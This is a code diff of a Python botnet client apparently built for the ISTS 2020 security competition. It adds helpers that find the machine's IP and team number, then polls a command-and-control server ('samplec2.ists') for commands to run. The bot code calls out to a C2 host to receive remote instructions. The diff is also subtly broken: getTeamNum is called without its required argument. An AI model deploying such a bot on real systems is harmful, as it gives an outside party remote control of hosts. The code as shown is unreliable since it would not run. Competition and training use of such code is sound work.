@@ -1,22 +1,33 @@
 """
 A sample python client which implements the bot for testing
-https://github.com/ritsec/ISTS2020-Botnet/blob/master/bot.py
+Original: https://github.com/ritsec/ISTS2020-Botnet/blob/master/bot.py
 """
 
 import os
 import requests
 import json
 import subprocess
+import socket
 
 def jprint(data):
     string = json.dumps(data, indent=2)
     string = "\t" + string.replace("\n", "\n\t") + "\n"
     print(string)
 
-def main():
-    server = "samplec2.ists"
-    ip = "10.2.0.0"
-    team = "5"
+def getLocalIP():
+    s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+    s.connect(("8.8.8.8", 80))
+    ip = s.getsockname()[0]
+    s.close()
+    return ip
+
+def getTeamNum(ip: str):
+    #ips in ISTS 2020 are of the form 10.x.1.10, where x is team, 1 is [1,2,3]
+    return ip.split(".")[1]
+
+def istsCallback(server: str):
+    ip = getLocalIP()
+    team = getTeamNum()
 
     print("[*] GET to {}/callback:".format(server))
     # Get the commands from the server
@@ -64,4 +75,4 @@ def main():
 
 
 if __name__ == "__main__":
-    main()
+    istsCallback("samplec2.ists")
